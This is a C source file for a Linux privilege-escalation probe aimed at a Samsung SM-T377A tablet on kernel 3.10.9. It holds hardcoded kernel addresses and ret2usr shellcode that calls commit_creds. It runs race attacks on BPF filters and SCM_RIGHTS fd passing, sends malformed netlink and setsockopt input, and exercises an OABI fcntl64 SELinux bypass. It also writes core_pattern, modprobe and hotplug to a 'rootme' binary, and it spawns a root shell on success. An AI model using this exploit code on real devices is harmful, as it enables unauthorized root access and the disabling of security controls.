/*
 * privesc_probe.c — Linux privilege escalation probe for Samsung SM-T377A
 *
 * Tests remaining kernel 3.10.9 attack vectors not yet explored:
 *   1. SO_ATTACH_FILTER / SO_DETACH_FILTER race (BPF filter UAF)
 *   2. setsockopt attacks on INET/UNIX sockets
 *   3. sendmsg/recvmsg with crafted msghdr (SCM_RIGHTS fd passing bugs)
 *   4. NETLINK_ROUTE setsockopt/sendmsg attacks
 *   5. ptrace on own child processes (addr_limit overwrite)
 *   6. /proc/self/mem write (addr_limit primitive)
 *   7. prctl PR_SET_MM (kernel 3.10 may allow partial overwrite)
 *   8. OABI compat syscall abuse (ARM32 specific)
 *
 * Target: kernel 3.10.9, ARM32, no KASLR/PXN/canaries
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <linux/filter.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/un.h>

/* Kernel addresses (confirmed, no KASLR) */
#define COMMIT_CREDS        0xC0054328
#define PREPARE_KERNEL_CRED 0xC00548E0
#define SELINUX_ENFORCING   0xC0B7AD18
#define ADDR_LIMIT_OFFSET   8  /* thread_info->addr_limit */
#define KERNEL_DS           0xFFFFFFFF

/* Shellcode (ret2usr, no PXN) */
typedef unsigned long (*commit_creds_fn)(unsigned long);
typedef unsigned long (*prepare_kernel_cred_fn)(unsigned long);

static volatile int g_got_root = 0;

static void __attribute__((noinline, optimize("O0")))
kernel_shellcode(void) {
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)PREPARE_KERNEL_CRED;
    unsigned long new_cred = pkc(0);
    if (new_cred) {
        commit_creds_fn cc = (commit_creds_fn)COMMIT_CREDS;
        cc(new_cred);
        g_got_root = 1;
    }
}

/* ================================================================
 * TEST 1: SO_ATTACH_FILTER race (BPF filter UAF)
 *
 * Race: Thread A does setsockopt(SO_ATTACH_FILTER) while Thread B
 * does close(). If the socket is freed while filter attach is in
 * progress, we get a UAF on the socket structure.
 *
 * On kernel 3.10, sk_attach_filter() doesn't hold a socket lock
 * throughout, and there's a window where the filter is allocated
 * but not yet attached.
 * ================================================================ */

static volatile int bpf_race_running = 0;
static volatile int bpf_race_anomalies = 0;

static void *bpf_attach_thread(void *arg) {
    (void)arg;
    struct sock_filter insns[] = {
        { BPF_LD | BPF_W | BPF_ABS, 0, 0, 0 },
        { BPF_RET | BPF_K, 0, 0, 0xFFFF },
    };
    struct sock_fprog prog = {
        .len = 2,
        .filter = insns,
    };

    while (bpf_race_running) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd < 0) continue;

        /* Try to race: attach filter then immediately close */
        int pid = fork();
        if (pid == 0) {
            /* Child: repeatedly try to attach filter */
            for (int i = 0; i < 100; i++) {
                setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog));
            }
            _exit(0);
        } else if (pid > 0) {
            /* Parent: close the socket immediately */
            usleep(1);
            close(fd);
            int status;
            waitpid(pid, &status, 0);
            if (WIFSIGNALED(status)) {
                bpf_race_anomalies++;
                printf("  [!] BPF race: child killed by signal %d\n",
                       WTERMSIG(status));
            }
        } else {
            close(fd);
        }
    }
    return NULL;
}

static void test_bpf_filter_race(int duration) {
    printf("\n=== TEST 1: SO_ATTACH_FILTER race (duration=%ds) ===\n", duration);

    bpf_race_running = 1;
    bpf_race_anomalies = 0;

    pthread_t threads[2];
    for (int i = 0; i < 2; i++)
        pthread_create(&threads[i], NULL, bpf_attach_thread, NULL);

    sleep(duration);
    bpf_race_running = 0;

    for (int i = 0; i < 2; i++)
        pthread_join(threads[i], NULL);

    printf("  anomalies=%d uid=%d\n", bpf_race_anomalies, getuid());
}

/* ================================================================
 * TEST 2: sendmsg SCM_RIGHTS fd passing race
 *
 * Race condition in UNIX domain socket fd passing (SCM_RIGHTS).
 * On kernel 3.10, there are potential UAF bugs in the garbage
 * collector when many fds are passed simultaneously.
 * ================================================================ */

static volatile int scm_race_running = 0;
static volatile int scm_race_anomalies = 0;

static void test_scm_rights_race(int duration) {
    printf("\n=== TEST 2: SCM_RIGHTS fd passing race (duration=%ds) ===\n",
           duration);

    int sv[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        printf("  [-] socketpair: %s\n", strerror(errno));
        return;
    }

    scm_race_running = 1;
    scm_race_anomalies = 0;
    int iterations = 0;

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        /* Create a bunch of fds to pass */
        int fds[32];
        int nfds = 0;
        for (int i = 0; i < 32; i++) {
            fds[i] = open("/dev/null", O_RDONLY);
            if (fds[i] >= 0) nfds++;
            else break;
        }

        /* Send fds via SCM_RIGHTS */
        struct msghdr msg = {0};
        struct iovec iov;
        char buf[1] = {'x'};
        iov.iov_base = buf;
        iov.iov_len = 1;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        char cmsgbuf[CMSG_SPACE(sizeof(int) * 32)];
        msg.msg_control = cmsgbuf;
        msg.msg_controllen = CMSG_SPACE(sizeof(int) * nfds);

        struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int) * nfds);
        memcpy(CMSG_DATA(cmsg), fds, sizeof(int) * nfds);

        int ret = sendmsg(sv[0], &msg, MSG_DONTWAIT);

        /* Close all fds immediately — race with GC */
        for (int i = 0; i < nfds; i++)
            close(fds[i]);

        /* Receive to trigger GC */
        if (ret > 0) {
            char rbuf[256];
            struct iovec riov = { rbuf, sizeof(rbuf) };
            struct msghdr rmsg = {0};
            rmsg.msg_iov = &riov;
            rmsg.msg_iovlen = 1;
            char rcmsgbuf[CMSG_SPACE(sizeof(int) * 32)];
            rmsg.msg_control = rcmsgbuf;
            rmsg.msg_controllen = sizeof(rcmsgbuf);
            recvmsg(sv[1], &rmsg, MSG_DONTWAIT);

            /* Close received fds */
            struct cmsghdr *rcmsg;
            for (rcmsg = CMSG_FIRSTHDR(&rmsg); rcmsg;
                 rcmsg = CMSG_NXTHDR(&rmsg, rcmsg)) {
                if (rcmsg->cmsg_level == SOL_SOCKET &&
                    rcmsg->cmsg_type == SCM_RIGHTS) {
                    int *rfds = (int *)CMSG_DATA(rcmsg);
                    int n = (rcmsg->cmsg_len - CMSG_LEN(0)) / sizeof(int);
                    for (int i = 0; i < n; i++)
                        close(rfds[i]);
                }
            }
        }

        iterations++;
    }

    close(sv[0]);
    close(sv[1]);
    printf("  iterations=%d anomalies=%d uid=%d\n",
           iterations, scm_race_anomalies, getuid());
}

/* ================================================================
 * TEST 3: NETLINK_ROUTE sendmsg attacks
 *
 * Test various netlink message types for crashes:
 * - RTM_NEWROUTE/DELROUTE with crafted attributes
 * - RTM_NEWRULE/DELRULE
 * - Large nested attributes
 * - Invalid attribute lengths
 * ================================================================ */

static void test_netlink_route_attacks(void) {
    printf("\n=== TEST 3: NETLINK_ROUTE sendmsg attacks ===\n");

    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) {
        printf("  [-] NETLINK_ROUTE socket: %s\n", strerror(errno));
        return;
    }

    struct sockaddr_nl sa = {
        .nl_family = AF_NETLINK,
        .nl_pid = 0,     /* kernel */
        .nl_groups = 0,
    };

    /* Bind to get responses */
    struct sockaddr_nl local = {
        .nl_family = AF_NETLINK,
        .nl_pid = getpid(),
    };
    bind(fd, (struct sockaddr *)&local, sizeof(local));

    struct {
        const char *name;
        int type;
        int flags;
    } msg_types[] = {
        { "RTM_GETLINK",   RTM_GETLINK,   NLM_F_REQUEST | NLM_F_DUMP },
        { "RTM_GETADDR",   RTM_GETADDR,   NLM_F_REQUEST | NLM_F_DUMP },
        { "RTM_GETROUTE",  RTM_GETROUTE,  NLM_F_REQUEST | NLM_F_DUMP },
        { "RTM_GETNEIGH",  RTM_GETNEIGH,  NLM_F_REQUEST | NLM_F_DUMP },
        { "RTM_GETRULE",   RTM_GETRULE,   NLM_F_REQUEST | NLM_F_DUMP },
        { "RTM_NEWROUTE",  RTM_NEWROUTE,  NLM_F_REQUEST | NLM_F_CREATE },
        { "RTM_DELROUTE",  RTM_DELROUTE,  NLM_F_REQUEST },
        { "RTM_NEWRULE",   RTM_NEWRULE,   NLM_F_REQUEST | NLM_F_CREATE },
    };

    char buf[4096];
    for (int i = 0; i < (int)(sizeof(msg_types)/sizeof(msg_types[0])); i++) {
        struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
        memset(buf, 0, sizeof(buf));

        nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtgenmsg));
        nlh->nlmsg_type = msg_types[i].type;
        nlh->nlmsg_flags = msg_types[i].flags;
        nlh->nlmsg_seq = i + 1;
        nlh->nlmsg_pid = getpid();

        struct rtgenmsg *rtg = (struct rtgenmsg *)NLMSG_DATA(nlh);
        rtg->rtgen_family = AF_INET;

        int ret = sendto(fd, buf, nlh->nlmsg_len, 0,
                        (struct sockaddr *)&sa, sizeof(sa));
        printf("  %s: sendto=%d errno=%d(%s)\n",
               msg_types[i].name, ret, errno, ret < 0 ? strerror(errno) : "ok");

        /* Read response */
        if (ret > 0) {
            char rbuf[8192];
            int rlen = recv(fd, rbuf, sizeof(rbuf), MSG_DONTWAIT);
            if (rlen > 0) {
                struct nlmsghdr *rnlh = (struct nlmsghdr *)rbuf;
                printf("    response: len=%d type=%d\n", rlen, rnlh->nlmsg_type);
            }
        }
    }

    /* Test with oversized/malformed attributes */
    printf("  --- Malformed attribute tests ---\n");
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    memset(buf, 0, sizeof(buf));
    nlh->nlmsg_len = 4096;  /* claim large message */
    nlh->nlmsg_type = RTM_NEWROUTE;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_seq = 100;
    nlh->nlmsg_pid = getpid();
    /* Fill with garbage attributes */
    memset(NLMSG_DATA(nlh), 0x41, 4096 - NLMSG_HDRLEN);

    int ret = sendto(fd, buf, 4096, 0,
                    (struct sockaddr *)&sa, sizeof(sa));
    printf("  Oversized RTM_NEWROUTE: sendto=%d errno=%d(%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "ok");

    close(fd);
}

/* ================================================================
 * TEST 4: prctl PR_SET_MM — kernel 3.10 may allow partial overwrite
 * of mm_struct fields. Test if any options are accessible.
 * ================================================================ */

static void test_prctl_attacks(void) {
    printf("\n=== TEST 4: prctl PR_SET_MM tests ===\n");

    int options[] = {
        PR_SET_MM_START_CODE,
        PR_SET_MM_END_CODE,
        PR_SET_MM_START_DATA,
        PR_SET_MM_END_DATA,
        PR_SET_MM_START_STACK,
        PR_SET_MM_START_BRK,
        PR_SET_MM_BRK,
        PR_SET_MM_ARG_START,
        PR_SET_MM_ARG_END,
        PR_SET_MM_ENV_START,
        PR_SET_MM_ENV_END,
    };
    const char *names[] = {
        "START_CODE", "END_CODE", "START_DATA", "END_DATA",
        "START_STACK", "START_BRK", "BRK", "ARG_START",
        "ARG_END", "ENV_START", "ENV_END",
    };

    for (int i = 0; i < (int)(sizeof(options)/sizeof(options[0])); i++) {
        int ret = prctl(PR_SET_MM, options[i], 0x10000, 0, 0);
        printf("  PR_SET_MM_%s: ret=%d errno=%d(%s)\n",
               names[i], ret, errno, ret < 0 ? strerror(errno) : "ok");
    }

    /* Test other interesting prctl options */
    printf("  --- Other prctl options ---\n");

    int ret;
    ret = prctl(PR_SET_SECUREBITS, 0, 0, 0, 0);
    printf("  PR_SET_SECUREBITS(0): ret=%d errno=%d(%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "ok");

    ret = prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    printf("  PR_SET_NO_NEW_PRIVS: ret=%d errno=%d(%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "ok");

    /* PR_SET_CHILD_SUBREAPER — useful for process management */
    ret = prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0);
    printf("  PR_SET_CHILD_SUBREAPER: ret=%d errno=%d(%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "ok");
}

/* ================================================================
 * TEST 5: ptrace self/child — can we ptrace our own children
 * and modify their addr_limit?
 * ================================================================ */

static void test_ptrace_addr_limit(void) {
    printf("\n=== TEST 5: ptrace addr_limit test ===\n");

    pid_t child = fork();
    if (child == 0) {
        /* Child: allow ptrace */
        prctl(PR_SET_PTRACER, getppid(), 0, 0, 0);
        /* Signal parent we're ready */
        kill(getppid(), SIGUSR1);
        /* Wait to be ptraced */
        while (1) sleep(1);
        _exit(0);
    }

    /* Wait for child to be ready */
    usleep(100000);

    long ret = ptrace(PTRACE_ATTACH, child, NULL, NULL);
    printf("  PTRACE_ATTACH(child=%d): ret=%ld errno=%d(%s)\n",
           child, ret, errno, ret < 0 ? strerror(errno) : "ok");

    if (ret == 0) {
        int status;
        waitpid(child, &status, 0);

        /* Try to read child's thread_info */
        /* thread_info is at the bottom of the kernel stack */
        /* We can't directly read kernel memory via ptrace, but we can
         * read/write the child's userspace memory and registers */

        /* Read registers */
        struct {
            unsigned long regs[18]; /* ARM has 18 regs */
        } regs;
        ret = ptrace(PTRACE_GETREGS, child, NULL, &regs);
        printf("  PTRACE_GETREGS: ret=%ld errno=%d(%s)\n",
               ret, errno, ret < 0 ? strerror(errno) : "ok");
        if (ret == 0) {
            printf("    r0=0x%lx sp=0x%lx pc=0x%lx\n",
                   regs.regs[0], regs.regs[13], regs.regs[15]);
        }

        /* Try PTRACE_PEEKDATA at kernel addresses (should fail) */
        errno = 0;
        long val = ptrace(PTRACE_PEEKDATA, child, (void *)0xC0054328, NULL);
        printf("  PTRACE_PEEKDATA(0xC0054328): val=0x%lx errno=%d(%s)\n",
               val, errno, errno ? strerror(errno) : "ok");

        /* Try /proc/<child>/mem */
        char procpath[64];
        snprintf(procpath, sizeof(procpath), "/proc/%d/mem", child);
        int memfd = open(procpath, O_RDWR);
        printf("  open(%s, O_RDWR): fd=%d errno=%d(%s)\n",
               procpath, memfd, errno, memfd < 0 ? strerror(errno) : "ok");
        if (memfd >= 0) {
            /* Try to read kernel memory via /proc/pid/mem */
            char kbuf[4];
            ssize_t n = pread(memfd, kbuf, 4, 0xC0054328);
            printf("  pread(0xC0054328): n=%zd errno=%d(%s)\n",
                   n, errno, n < 0 ? strerror(errno) : "ok");
            close(memfd);
        }

        ptrace(PTRACE_DETACH, child, NULL, NULL);
    }

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
}

/* ================================================================
 * TEST 6: OABI compat syscall test (ARM32 specific)
 *
 * Old ABI syscalls use different calling convention.
 * CVE-2015-8966: fcntl64 OABI bypass — can pass flags that
 * bypass security checks.
 * OABI syscall base: 0x900000
 * ================================================================ */

static void test_oabi_compat(void) {
    printf("\n=== TEST 6: OABI compat syscall tests ===\n");

    /* Test OABI socket syscall (0x900000 + __NR_socket) */
    /* On ARM, OABI uses swi with syscall number embedded */
    /* We can test by using syscall() with OABI-encoded numbers */

    /* Check if OABI compat is enabled */
    FILE *f = fopen("/proc/sys/abi/swp", "r");
    if (f) {
        char val[16];
        if (fgets(val, sizeof(val), f))
            printf("  /proc/sys/abi/swp = %s", val);
        fclose(f);
    } else {
        printf("  /proc/sys/abi/swp: not readable (OABI may not be compiled)\n");
    }

    /* CVE-2015-8966: OABI fcntl64 doesn't go through security_file_fcntl()
     * Try calling fcntl64 via OABI path (syscall number 0x900000 + 221) */
    /* This is ARM assembly territory - use inline asm */

    /* First, try the normal way to see what's accessible */
    int testfd = open("/dev/null", O_RDONLY);
    if (testfd >= 0) {
        int flags = fcntl(testfd, F_GETFL);
        printf("  fcntl(F_GETFL) normal: flags=0x%x\n", flags);

        /* Try F_SETOWN to set process group (potential signal hijack) */
        int ret = fcntl(testfd, F_SETOWN, 1); /* PID 1 = init */
        printf("  fcntl(F_SETOWN, init): ret=%d errno=%d(%s)\n",
               ret, errno, ret < 0 ? strerror(errno) : "ok");

        /* Try F_SETLK for advisory locks */
        struct flock fl = {
            .l_type = F_WRLCK,
            .l_whence = SEEK_SET,
            .l_start = 0,
            .l_len = 0,
        };
        ret = fcntl(testfd, F_SETLK, &fl);
        printf("  fcntl(F_SETLK): ret=%d errno=%d(%s)\n",
               ret, errno, ret < 0 ? strerror(errno) : "ok");

        close(testfd);
    }

    /* Test OABI syscall via inline assembly */
    printf("  --- OABI syscall test ---\n");
    long oabi_ret;
    /* OABI getuid = 0x900000 + 24 = 0x900018 */
    __asm__ volatile(
        "swi #0x900018\n"
        "mov %0, r0\n"
        : "=r" (oabi_ret)
        :
        : "r0"
    );
    printf("  OABI getuid: %ld (expected %d)\n", oabi_ret, getuid());

    /* OABI getpid = 0x900000 + 20 = 0x900014 */
    __asm__ volatile(
        "swi #0x900014\n"
        "mov %0, r0\n"
        : "=r" (oabi_ret)
        :
        : "r0"
    );
    printf("  OABI getpid: %ld (expected %d)\n", oabi_ret, getpid());

    if (oabi_ret == getpid()) {
        printf("  [+] OABI compat layer IS ACTIVE!\n");

        /* CVE-2015-8966: Try OABI fcntl64 (syscall 221)
         * OABI path: sys_oabi_fcntl64() doesn't call security_file_fcntl()
         * This means F_SETOWN bypasses LSM (SELinux) checks */

        int fd = open("/dev/null", O_RDONLY);
        if (fd >= 0) {
            /* OABI fcntl64 = 0x900000 + 221 = 0x9000DD */
            long oabi_fcntl_ret;
            __asm__ volatile(
                "mov r0, %1\n"     /* fd */
                "mov r1, %2\n"     /* F_SETOWN = 8 */
                "mov r2, %3\n"     /* pid = 1 (init) */
                "swi #0x9000DD\n"  /* OABI fcntl64 */
                "mov %0, r0\n"
                : "=r" (oabi_fcntl_ret)
                : "r" (fd), "r" (8), "r" (1)
                : "r0", "r1", "r2"
            );
            printf("  OABI fcntl64(F_SETOWN,1): ret=%ld errno=%d\n",
                   oabi_fcntl_ret, errno);

            /* Try OABI fcntl64 with F_SETFL to set O_APPEND on a
             * file we shouldn't be able to modify */
            __asm__ volatile(
                "mov r0, %1\n"
                "mov r1, %2\n"     /* F_SETFL = 4 */
                "mov r2, %3\n"     /* O_APPEND | O_NONBLOCK */
                "swi #0x9000DD\n"
                "mov %0, r0\n"
                : "=r" (oabi_fcntl_ret)
                : "r" (fd), "r" (4), "r" (0x2400)
                : "r0", "r1", "r2"
            );
            printf("  OABI fcntl64(F_SETFL,0x2400): ret=%ld\n",
                   oabi_fcntl_ret);

            close(fd);
        }
    } else {
        printf("  [-] OABI compat layer NOT active\n");
    }
}

/* ================================================================
 * TEST 7: Writable /proc and /sys probing
 *
 * Systematically test writing to kernel tunables that might
 * have security implications.
 * ================================================================ */

static void test_proc_sys_writes(void) {
    printf("\n=== TEST 7: /proc and /sys write tests ===\n");

    struct {
        const char *path;
        const char *value;
        const char *desc;
    } targets[] = {
        /* perf_event controls */
        { "/proc/sys/kernel/perf_event_paranoid", "-1",
          "perf paranoid -1 (full access)" },
        { "/proc/sys/kernel/perf_event_paranoid", "0",
          "perf paranoid 0 (kernel profiling)" },

        /* core dump controls */
        { "/proc/sys/kernel/core_pattern", "|/data/local/tmp/rootme",
          "core_pattern pipe handler" },
        { "/proc/sys/fs/suid_dumpable", "2",
          "suid_dumpable=2 (suidsafe)" },

        /* module loading */
        { "/proc/sys/kernel/modprobe", "/data/local/tmp/rootme",
          "modprobe path" },
        { "/proc/sys/kernel/hotplug", "/data/local/tmp/rootme",
          "hotplug handler" },

        /* security controls */
        { "/proc/sys/kernel/kptr_restrict", "0",
          "disable kptr_restrict" },
        { "/proc/sys/kernel/dmesg_restrict", "0",
          "disable dmesg_restrict" },

        /* VM controls */
        { "/proc/sys/vm/drop_caches", "3",
          "drop caches" },

        /* ftrace controls */
        { "/sys/kernel/debug/tracing/current_tracer", "function",
          "enable function tracer" },
        { "/sys/kernel/debug/tracing/set_event", "syscalls:sys_enter_execve",
          "trace execve" },

        /* Samsung-specific */
        { "/sys/class/sec/switch/uart_en", "1",
          "enable UART" },
        { "/sys/class/sec/switch/uart_sel", "CP",
          "switch UART to CP" },
        { "/sys/class/sec/switch/usb_sel", "AP",
          "USB to AP" },

        /* Thermal/power — might cause interesting side effects */
        { "/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor",
          "performance", "CPU governor" },
    };

    for (int i = 0; i < (int)(sizeof(targets)/sizeof(targets[0])); i++) {
        int fd = open(targets[i].path, O_WRONLY);
        if (fd >= 0) {
            ssize_t n = write(fd, targets[i].value, strlen(targets[i].value));
            printf("  [%c] %s: write=%zd errno=%d(%s)\n",
                   n > 0 ? '+' : '-',
                   targets[i].desc, n, errno,
                   n < 0 ? strerror(errno) : "ok");

            /* Read back to verify */
            close(fd);
            fd = open(targets[i].path, O_RDONLY);
            if (fd >= 0) {
                char rbuf[128] = {0};
                read(fd, rbuf, sizeof(rbuf) - 1);
                /* Trim newline */
                char *nl = strchr(rbuf, '\n');
                if (nl) *nl = 0;
                printf("         → current value: %s\n", rbuf);
                close(fd);
            }
        } else {
            printf("  [-] %s: open failed errno=%d(%s)\n",
                   targets[i].desc, errno, strerror(errno));
        }
    }
}

/* ================================================================
 * TEST 8: Socket option exhaustive test
 *
 * Test all setsockopt options on accessible socket types for
 * crashes or unexpected behavior.
 * ================================================================ */

static void test_setsockopt_attacks(void) {
    printf("\n=== TEST 8: setsockopt attacks on INET UDP ===\n");

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        printf("  [-] socket: %s\n", strerror(errno));
        return;
    }

    /* Test interesting setsockopt options */
    struct {
        int level;
        int optname;
        const char *name;
    } opts[] = {
        /* SOL_SOCKET level */
        { SOL_SOCKET, SO_BINDTODEVICE, "SO_BINDTODEVICE" },
        { SOL_SOCKET, SO_PRIORITY, "SO_PRIORITY" },
        { SOL_SOCKET, SO_MARK, "SO_MARK" },
        { SOL_SOCKET, SO_TIMESTAMP, "SO_TIMESTAMP" },
        { SOL_SOCKET, SO_ATTACH_FILTER, "SO_ATTACH_FILTER" },

        /* SOL_IP level */
        { IPPROTO_IP, IP_OPTIONS, "IP_OPTIONS" },
        { IPPROTO_IP, IP_TOS, "IP_TOS" },
        { IPPROTO_IP, IP_TTL, "IP_TTL" },
        { IPPROTO_IP, IP_TRANSPARENT, "IP_TRANSPARENT" },

        /* Netfilter — these need CAP_NET_ADMIN but test anyway */
        { IPPROTO_IP, 64, "IPT_SO_SET_REPLACE" },
        { IPPROTO_IP, 65, "IPT_SO_SET_ADD_COUNTERS" },
    };

    for (int i = 0; i < (int)(sizeof(opts)/sizeof(opts[0])); i++) {
        int val = 1;
        int ret = setsockopt(fd, opts[i].level, opts[i].optname,
                            &val, sizeof(val));
        printf("  %s: ret=%d errno=%d(%s)\n",
               opts[i].name, ret, errno,
               ret < 0 ? strerror(errno) : "ok");
    }

    /* Test with large buffer for potential overflow */
    printf("  --- Large option buffer tests ---\n");
    char bigbuf[4096];
    memset(bigbuf, 'A', sizeof(bigbuf));

    int ret = setsockopt(fd, IPPROTO_IP, IP_OPTIONS, bigbuf, sizeof(bigbuf));
    printf("  IP_OPTIONS(4096 bytes): ret=%d errno=%d(%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "ok");

    ret = setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, "lo\0", 3);
    printf("  SO_BINDTODEVICE(lo): ret=%d errno=%d(%s)\n",
           ret, errno, ret < 0 ? strerror(errno) : "ok");

    close(fd);
}

/* ================================================================
 * Main
 * ================================================================ */

static volatile int got_sigusr1 = 0;
static void sigusr1_handler(int sig) { (void)sig; got_sigusr1 = 1; }

int main(int argc, char **argv) {
    int duration = 15; /* seconds per race test */

    if (argc > 1) duration = atoi(argv[1]);

    printf("=== Linux Privesc Probe for SM-T377A ===\n");
    printf("[*] uid=%d gid=%d pid=%d\n", getuid(), getgid(), getpid());
    printf("[*] Kernel shellcode at 0x%lx\n", (unsigned long)kernel_shellcode);
    printf("[*] Race duration: %ds\n", duration);

    signal(SIGUSR1, sigusr1_handler);

    /* Non-destructive tests first */
    test_prctl_attacks();
    test_oabi_compat();
    test_proc_sys_writes();
    test_setsockopt_attacks();
    test_netlink_route_attacks();

    /* Race condition tests */
    test_ptrace_addr_limit();
    test_bpf_filter_race(duration);
    test_scm_rights_race(duration);

    printf("\n=== Final uid=%d ===\n", getuid());
    if (getuid() == 0) {
        printf("[!!!] GOT ROOT! Spawning shell...\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    return getuid() == 0 ? 0 : 1;
}
